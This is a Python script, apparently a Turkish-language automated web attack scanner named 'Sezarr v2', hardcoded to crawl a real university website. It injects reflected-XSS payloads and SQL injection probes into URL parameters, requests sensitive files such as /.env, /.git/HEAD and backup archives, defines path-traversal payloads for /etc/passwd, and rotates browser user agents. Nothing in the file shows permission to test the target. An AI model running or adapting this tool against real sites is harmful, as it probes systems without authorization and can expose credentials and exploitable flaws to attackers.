from bs4 import BeautifulSoup
import concurrent.futures
import csv
import random
import urllib.parse
import requests
import sys

if sys.platform.startswith("win"):
  try:
    import os
    os.system("")
  except:
    pass

C_RED = "\033[91m"
C_GREEN = "\033[92m"
C_YELLOW = "\033[93m"
C_CYAN = "\033[96m"
C_RESET = "\033[0m"

BANNER = f"""{C_CYAN}
  ███████╗███████╗███████╗ █████╗ ██████╗ ██████╗ 
  ██╔════╝██╔════╝╚══███╔╝██╔══██╗██╔══██╗██╔══██╗
  ███████╗█████╗    ███╔╝ ███████║██████╔╝██████╔╝
  ╚════██║██╔══╝   ███╔╝  ██╔══██║██╔══██╗██╔══██╗
  ███████║███████╗███████╗██║  ██║██║  ██║██║  ██║
  ╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝
{C_RESET}  {C_YELLOW}'Sezarr v2.0.0.0 - 'Sezarr{C_RESET}
--------------------------------------------------"""

# Taranacak Hedefler 1 den fazla eklenebilirs
TARGET_SITES = [
    "https://1403.iee.ihu.gr/",
]

XSS_PAYLOADS = [
    "</title><script>alert(1)</script>",
    '"><script>alert(document.domain)</script>',
]
SQL_ERRORS = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "pg_query()",
    "sqlite3.operationalerror",
]
LFI_PAYLOADS = ["../../../../etc/passwd", "../../../../windows/win.ini"]
SENSIBLE_FILES = [
    "/.env",
    "/.git/HEAD",
    "/robots.txt",
    "/config.json",
    "/backup.zip",
    "/admin",
    "/yonetim",
    "/wp-login.php",
    "/phpmyadmin",
]

USER_AGENTS = [
    (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,"
        " like Gecko) Chrome/122.0.0.0 Safari/537.36"
    ),
    (
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15"
        " (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15"
    ),
]

def get_headers():
  return {"User-Agent": random.choice(USER_AGENTS)}

def zafiyetleri_test_et(url, param_adi, query_params, method="GET", form_action=None):
  bulgular = []
  
  # XSS
  for p in XSS_PAYLOADS:
    t_params = query_params.copy()
    t_params[param_adi] = p
    try:
      if method == "GET":
        t_url = url.replace(urllib.parse.urlparse(url).query, urllib.parse.urlencode(t_params))
        r = requests.get(t_url, headers=get_headers(), timeout=4)
      else:
        r = requests.post(form_action or url, data=t_params, headers=get_headers(), timeout=4)
        
      if p in r.text:
        bulgular.append({"URL": url, "Zafiyet": f"Reflected XSS ({method})", "Risk": "Yüksek", "Aciklama": f"Parametre: {param_adi}"})
        print(f"{C_RED}[!] XSS BULUNDU: {url} [{param_adi}]{C_RESET}")
        break
    except:
      pass

  # SQLia
  t_params = query_params.copy()
  t_params[param_adi] = "'"
  try:
    if method == "GET":
      s_url = url.replace(urllib.parse.urlparse(url).query, urllib.parse.urlencode(t_params))
      r = requests.get(s_url, headers=get_headers(), timeout=4)
    else:
      r = requests.post(form_action or url, data=t_params, headers=get_headers(), timeout=4)
      
    for err in SQL_ERRORS:
      if err in r.text.lower():
        bulgular.append({"URL": url, "Zafiyet": f"SQL Injection ({method})", "Risk": "Kritik", "Aciklama": f"Parametre: {param_adi} | Hata: {err}"})
        print(f"{C_RED}[!] SQLi BULUNDU: {url} [{param_adi}]{C_RESET}")
        break
  except:
    pass

  return bulgular

def siteyi_parcala(base_url):
  bulgular = []
  print(f"{C_CYAN}[*] Hedef Taranıyor: {base_url}{C_RESET}")
  visited_pages = set()
  to_visit = {base_url}

  try:
    while to_visit and len(visited_pages) < 15:
      current_url = to_visit.pop()
      if current_url in visited_pages:
        continue
      visited_pages.add(current_url)

      resp = requests.get(current_url, headers=get_headers(), timeout=5)
      resp_headers = resp.headers

      if "Server" in resp_headers:
        bulgular.append({"URL": current_url, "Zafiyet": "Bilgi İfşası", "Risk": "Düşük", "Aciklama": f"Sunucu: {resp_headers['Server']}"})
        print(f"{C_YELLOW}[+] Bilgi İfşası: {current_url} -> {resp_headers['Server']}{C_RESET}")

      parsed_base = urllib.parse.urlparse(current_url)
      domain_root = f"{parsed_base.scheme}://{parsed_base.netloc}"
      
      # Dizin Taraması  yp
      for dizin in SENSIBLE_FILES:
        d_url = domain_root + dizin
        try:
          d_resp = requests.get(d_url, headers=get_headers(), timeout=3)
          if d_resp.status_code == 200 and ("html" not in d_resp.text.lower() or "admin" in dizin):
            bulgular.append({"URL": d_url, "Zafiyet": "Kritik Dosya / Dizin", "Risk": "Yüksek", "Aciklama": f"Erişilen: {dizin}"})
            print(f"{C_RED}[!] Kritik Dizin: {d_url}{C_RESET}")
        except:
          pass

      # GE1T Parametreleri
      query_params = dict(urllib.parse.parse_qsl(parsed_base.query))
      if query_params:
        for p_name in query_params.keys():
          bulgular.extend(zafiyetleri_test_et(current_url, p_name, query_params, method="GET"))

      # Linkleri tOPla
      soup = BeautifulSoup(resp.text, "html.parser")
      for link in soup.find_all("a", href=True):
        full_link = urllib.parse.urljoin(base_url, link["href"])
        if urllib.parse.urlparse(full_link).netloc == parsed_base.netloc:
          if full_link not in visited_pages:
            to_visit.add(full_link)

  except Exception as e:
    print(f"{C_RED}[-] Hata ({base_url}): {e}{C_RESET}")

  return bulgular

def main():
  print(BANNER)
  tum_sonuclar = []

  with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
    futures = {executor.submit(siteyi_parcala, site): site for site in TARGET_SITES}
    for future in concurrent.futures.as_completed(futures):
      try:
        res = future.result()
        if res:
          tum_sonuclar.extend(res)
      except Exception as exc:
        print(f"[-] İşlem hatası: {exc}")

  rapor_adi = "sezarrV2_tarama_raporu.csv"
  with open(rapor_adi, mode="w", newline="", encoding="utf-8-sig") as f:
    writer = csv.DictWriter(f, fieldnames=["URL", "Zafiyet", "Risk", "Aciklama"])
    writer.writeheader()
    for b in tum_sonuclar:
      writer.writerow(b)

  print(f"\n{C_GREEN}[+] OPERASYON TAMAMLANDI! Rapor kaydedildi: '{rapor_adi}'{C_RESET}")

if __name__ == "__main__":
  main()